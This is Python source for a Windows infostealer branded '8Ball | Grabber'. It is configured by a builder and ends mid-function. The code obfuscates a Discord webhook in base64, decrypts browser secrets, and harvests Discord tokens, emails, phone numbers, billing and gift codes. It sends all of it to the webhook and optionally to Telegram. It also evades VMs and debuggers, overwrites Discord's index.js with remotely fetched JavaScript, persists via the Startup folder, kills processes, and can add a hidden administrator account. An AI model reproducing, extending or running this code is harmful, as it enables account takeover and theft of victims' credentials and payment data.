import base64
import os
import re
import sys
import time
import shutil
import requests
import random
import warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

# Debug log helper ? writes to TEMP\rx_debug.log for noconsole troubleshooting
def RX_DB6(msg):
    pass
print = lambda *a, **kw: None
import threading
import subprocess
from sys import executable, stderr
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED, ZIP_STORED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen

_SRC_URL_B64 = "aHR0cHM6Ly9naXRodWIuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvYmxvYi9tYWluL3NzdHViLnB5"
try:
    SRC_URL = base64.b64decode(_SRC_URL_B64).decode("utf-8")
except Exception:
    SRC_URL = ""

APPBOUND_KEY_HEX = ""
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from json import loads as json_loads, load
from json import *
import ctypes
import winreg
import urllib




class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

# --- FEATURE CONFIG (written by builder) ---
# The builder injects/overrides this dict to reflect selected UI features.
#
# Mapping to GUI (builder.pyw):
#   "Discord Token Stealer"        -> discord_tokens
#   "Browser Data Extractor"       -> browser_data
#   "Local Files"                  -> file_search
#   "Discord JavaScript Injection" -> discord_injection
#   "Anti-Debugging/VM"            -> anti_debug
#   "IP and Location Information"  -> ip_location_info
#   "Nitro and Badge Information"  -> nitro_badges_info
#   "User Billing Information"     -> user_billing_info
#   "Discord Gift Codes"           -> discord_gift_codes
#   "Crypto Walletr"               -> wallet_gaming_data
#   "Telegram"                     -> telegram_desktop
#   "Browser Autofill and History" -> browser_autofill_history
#   "Browser Bookmarks"            -> browser_bookmarks
#   "Credit Cards"                 -> browser_credit_cards
#   "Startup Persistence"          -> startup_persistence
FEATURE_CONFIG = {
    "discord_tokens": True,
    "browser_data": False,
    "file_search": False,
    "discord_injection": False,
    "anti_debug": False,
    "ip_location_info": False,
    "nitro_badges_info": False,
    "user_billing_info": False,
    "discord_gift_codes": False,
    "wallet_gaming_data": False,
    "telegram_desktop": False,
    "browser_autofill_history": False,
    "browser_bookmarks": False,
    "browser_credit_cards": False,
    "startup_persistence": False,
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    "ping_user": False,
}



















































def antidebug():
    """Anti-debug / anti-VM – only runs when anti_debug feature is enabled."""
    if not FEATURE_CONFIG.get("anti_debug", False):
        return
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()
    
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def fetch_window_titles(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return set(response.text.strip().split('\r\n'))
    except Exception:
        return set()

def check_windows():
    window_titles_url = 'https://pastebin.com/raw/sih1JMj5'
    window_titles = fetch_window_titles(window_titles_url)

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in window_titles:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)

def fetch_blocked_ip(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return set(response.text.strip().split('\r\n'))
    except Exception:
        return set()

def check_ip():
    blocked_ip_url = 'https://pastebin.com/raw/X9qMzxj2'
    blacklisted = fetch_blocked_ip(blocked_ip_url)
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')

_h_enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi aG9va3MvMTUxNzc2OTA0MzYzNTg2MzYyMy9PZnZvc2J0SVpIRDhHcklWZnJhWVpPUDlpUy1NR2R3M0gxRHdCTmtIQVFtSlRPbDBnNHZvYXZzVWRZLUtKUlprdGJtcQ=="
try:
    h00k = b64decode(_h_enc).decode()
except Exception:
    h00k = b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi aG9va3MvMTUxNzc2OTA0MzYzNTg2MzYyMy9PZnZvc2J0SVpIRDhHcklWZnJhWVpPUDlpUy1NR2R3M0gxRHdCTmtIQVFtSlRPbDBnNHZvYXZzVWRZLUtKUlprdGJtcQ==").decode()
inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G371P():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"


# Helper: log / print enabled features at startup for debugging
def print_enabled_features():
    try:
        enabled = [name for name, on in FEATURE_CONFIG.items() if on]
        if not enabled:
            msg = "[8Ball] No features enabled in FEATURE_CONFIG."
        else:
            msg = "[8Ball] Enabled features: " + ", ".join(enabled)
        print(msg)
    except Exception:
        pass

def send_confirmation_embed(title, description):
    """Send a simple confirmation embed to the webhook, silently ignoring errors."""
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        payload = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{
                "title": title,
                "description": description,
                "footer": {"text": "8Ball", "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"}
            }],
            "username": "8Ball | Grabber",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
        RX_DB6(f"[8Ball] Confirmation embed sent: {title}")
    except Exception:
        pass


def Z1PF01D3r(foldername, target_dir):            
    zip_path = temp+"/"+foldername + '.zip'
    zipobj = ZipFile(zip_path, 'w', ZIP_STORED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if "user_data" in fn:
                continue
            if not os.path.isfile(fn):
                continue
            try:
                zipobj.write(fn, fn[rootlen:])
            except (PermissionError, OSError):
                continue
            except ValueError:
                zi = ZipInfo(fn[rootlen:])
                zi.date_time = (1980, 1, 1, 0, 0, 0)
                zi.compress_type = ZIP_STORED
                try:
                    with open(fn, 'rb') as f:
                        zipobj.writestr(zi, f.read())
                except (PermissionError, OSError):
                    continue
    zipobj.close()

def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None, appbound_key=None):
    if not isinstance(buff, bytes) or len(buff) < 15:
        return None
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts in ('v10', 'v11'):
        iv = buff[3:15]
        payload = buff[15:]
        key = master_key
    elif starts == 'v20':
        iv = buff[3:15]
        payload = buff[15:]
        key = appbound_key if appbound_key else master_key
    else:
        return None
    if key is None:
        return None
    try:
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        if len(decrypted_pass) < 16:
            return None
        decrypted_pass = decrypted_pass[:-16]
        try: decrypted_pass = decrypted_pass.decode()
        except: pass
        return decrypted_pass
    except:
        return None

def L04DUr118(h00k, data='', headers=None):
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    for i in range(8):
        try:
            r = urlopen(Request(h00k, data=data, headers=headers))
            return r
        except Exception as e:
            RX_DB6(f"[8Ball] L04DUr118 attempt {i+1} failed: {type(e).__name__}: {e}")
            pass

def L04DUr118_TG(bot_token, chat_id, text):
    """Send a message via Telegram bot API."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        urlopen(Request(url, data=dumps(data).encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except:
        pass

def G108411NF0():
    """
    Build a global info string with IP + location + local time and timezone.
    Controlled by ip_location_info feature.
    """
    try:
        import datetime
        import time as _time

        username = os.getenv("USERNAME") or "Unknown"
        now = datetime.datetime.now()
        try:
            tz_name = _time.tzname[0]
        except Exception:
            tz_name = "UnknownTZ"
        local_time_str = now.strftime("%Y-%m-%d %H:%M:%S")

        if not FEATURE_CONFIG.get("ip_location_info", False):
            return f":rainbow_flag:  - `{username.upper()} | {local_time_str} ({tz_name})`"

        # Use ip-api.com (free, no key needed)
        ipdata_json = urlopen(
            Request(f"http://ip-api.com/json/{IP}")
        ).read().decode()
        ipdata = loads(ipdata_json)
        contry = ipdata.get("country", "Unknown")
        contryCode = ipdata.get("countryCode", "").lower()
        city = ipdata.get("city", "")
        region = ipdata.get("regionName", "")
        timezone = ipdata.get("timezone", "")

        loc_parts = [p for p in [city, region, contry] if p]
        loc_str = ", ".join(loc_parts) if loc_parts else contry

        if contryCode:
            globalinfo = (
                f":flag_{contryCode}:  - `{username.upper()} | {IP} ({loc_str}) | "
                f"{local_time_str} (TZ:{timezone})`"
            )
        else:
            globalinfo = (
                f":rainbow_flag:  - `{username.upper()} | {IP} ({contry}) | "
                f"{local_time_str} (TZ:{timezone})`"
            )
        return globalinfo

    except:
        try:
            import datetime
            import time as _time
            now = datetime.datetime.now()
            local_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
            tz_name = _time.tzname[0]
            return f":rainbow_flag:  - `{username} | {local_time_str} ({tz_name})`"
        except Exception:
            return f":rainbow_flag:  - `{username}`"

def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "ShellHost" in process:
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")


def inj3c710n():
    """
    Discord JavaScript Injection feature:
    rewrites Discord's index.js to inject custom code.
    Fully gated by 'Discord JavaScript Injection' (discord_injection) so it only runs when enabled.
    """
    if not FEATURE_CONFIG.get("discord_injection", False):
        return

    try:
        username = os.getlogin()
    except Exception:
        username = "Unknown"

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA', ''), folder_name)
        if not os.path.isdir(deneme_path):
            continue

        for subdir, dirs, files in os.walk(deneme_path):
            if 'app-' not in subdir:
                continue
            for dir in dirs:
                if 'modules' not in dir:
                    continue
                module_path = os.path.join(subdir, dir)
                for subsubdir, subdirs, subfiles in os.walk(module_path):
                    if 'discord_desktop_core-' not in subsubdir:
                        continue
                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                        if 'discord_desktop_core' not in subsubsubdir:
                            continue
                        for file in subsubfiles:
                            if file != 'index.js':
                                continue
                            file_path = os.path.join(subsubsubdir, file)
                            try:
                                injeCTmED0cT0r_cont = requests.get(inj3c710n_url, timeout=5).text
                                injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k)
                                with open(file_path, "w", encoding="utf-8") as index_file:
                                    index_file.write(injeCTmED0cT0r_cont)
                            except Exception:
                                # Do not crash Discord/Chrome; just skip on error
                                continue


# Call feature logger and selectively run features based on FEATURE_CONFIG
print_enabled_features()

# Anti-debug if enabled
antidebug()

# Discord injection if enabled; wrap so it cannot crash the process
try:
    inj3c710n()
except Exception:
    pass





def G37C0D35(token):
    """Discord gift codes – returns empty when feature disabled."""
    if not FEATURE_CONFIG.get("discord_gift_codes", False):
        return ""
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

def G3781111N6(token):
    """User billing info – returns '`Disabled`' when feature disabled."""
    if not FEATURE_CONFIG.get("user_billing_info", False):
        return "`Disabled`"

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return "`None`"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def G3784D63(flags):
    """
    Nitro / badge decoder.
    Controlled by nitro_badges_info feature:
      - if disabled, returns empty string.
    """
    if not FEATURE_CONFIG.get("nitro_badges_info", False):
        return ''

    if flags == 0:
        return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G37UHQFr13ND5(token):
    """HQ friends list – returns False when feature disabled."""
    if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
        return False

    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"

def G37UHQ6U11D5(token):
    """
    HQ guilds list.
    Currently disabled from UI (no checkbox), so always gated off by default.
    """
    if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
        return '`No HQ Guilds Found`'
    try:
        uhqguilds = ''

        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<a:CH_IconArrowRight:715585320178941993> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'


def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if FEATURE_CONFIG.get("nitro_badges_info", False) and "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson:
        phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "`None`"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(
    os.path.expanduser('~'),
    'AppData',
    'Roaming',
    'Microsoft',
    'Windows',
    'Start Menu',
    'Programs',
    'Startup'
)
startupFilePath = os.path.join(startupFolderPath, fileName)

def ensure_startup_persistence():
    """
    Startup Persistence feature:
    Silently copy the current executable/script into the user's Startup folder,
    but only when the startup_persistence feature is enabled.
    """
    if not FEATURE_CONFIG.get("startup_persistence", False):
        return

    try:
        os.makedirs(startupFolderPath, exist_ok=True)
        if os.path.abspath(filePath).lower() == os.path.abspath(startupFilePath).lower():
            return
        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
            shutil.copyfileobj(src_file, dst_file)
    except Exception:
        pass

ensure_startup_persistence()

def create_windows_user():
    try:
        subprocess.run('net user hello helloworld /add', shell=True, check=False, capture_output=True)
        subprocess.run('net localgroup Administrators hello /add', shell=True, check=False, capture_output=True)
    except Exception:
        pass

def remove_windows_user():
    try:
        subprocess.run('net user hello /delete', shell=True, check=False, capture_output=True)
    except Exception:
        pass

def Tr1M(obj):
    if not isinstance(obj, str):
        return str(obj) if obj else ""
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def UP104D70K3N(token, path):
    # Respect feature config: only send tokens when enabled
    if not FEATURE_CONFIG.get("discord_tokens", True):
        return

    try:
        RX_DB6(f"[8Ball] UP104D70K3N: Sending embed for token {token[:20]}...")
        global h00k
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
        billing = G3781111N6(token)
        badge = G3784D63(flags)
        friends = Tr1M(G37UHQFr13ND5(token))
        guilds = Tr1M(G37UHQ6U11D5(token))
        codes = Tr1M(G37C0D35(token))

        if codes == "": codes = "`No Gifts Found`"
        if billing == "": billing = "🔒"
        if badge == "" and nitro == "": badge, nitro = ":```None```", ""
        if phone == "": phone = "🔒"
        if friends == "": friends = "```No Rare Friends```"
        if guilds == "": guilds = ":lock:"
        path = path.replace("\\", "/")

        data = {
            "content": f'@everyone @here {GLINFO} **Found in** `{path}`',
            "embeds": [
                {"fields": [
                    {
                        "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                        "value": f"```{token}```"
                    },
                    {
                        "name": "<:mail:750393870507966486> Email:",
                        "value": f"```{email}```",
                        "inline": True
                    },
                    {
                        "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                        "value": f"``{phone}``",
                        "inline": True
                    },
                    {
                        "name": "<:mc_earth:589630396476555264> IP:",
                        "value": f"```{G371P()}```",
                        "inline": True
                    },
                    {
                        "name": "<:woozyface:874220843528486923> Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                        "value": f"{billing}",
                        "inline": True
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                        "value": f"{friends}",
                        "inline": False
                    },
                    {
                        "name": "<:woozyface:874220843528486923> HQ Guilds:",
                        "value": f"{guilds}",
                        "inline": False
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> Gift Codes:",
                        "value": f"{codes}",
                        "inline": False
                    }
                    ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                    },
                "footer": {
                    "text": f"8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                    },
                "thumbnail": {
                    "url": f"{pfp}"
                    }
                }
            ],
            "username": f"8Ball | Grabber",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
        tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
        if tg_token and tg_chat:
            tg_text = f"{GLINFO}\nToken: {token}\nEmail: {email}\nIP: {G371P()}"
            L04DUr118_TG(tg_token, tg_chat, tg_text)
    except Exception as e:
        RX_DB6(f"[8Ball] UP104D70K3N error for token {token[:20]}...: {type(e).__name__}: {e}")

def r3F0rM47(listt):
    e = re.findall(r"(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    # Generic uploader for non-token data; feature gating happens at call sites.
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if "Data Searcher" in name:
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [
                {
               "title": f"8Ball | Data Extractor","fields": link,
                "footer": {
                    "text": f"8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                },
                }
            ],
            "username": f"8Ball | Grabber",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                if x.startswith("└─"):
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [
                {"fields": endlist,
                "title": f"8Ball | File 8Ball",
                "footer": {
                    "text": f"8Ball",
                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
                }
                }
            ],
            "username": f"8Ball | Grabber",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
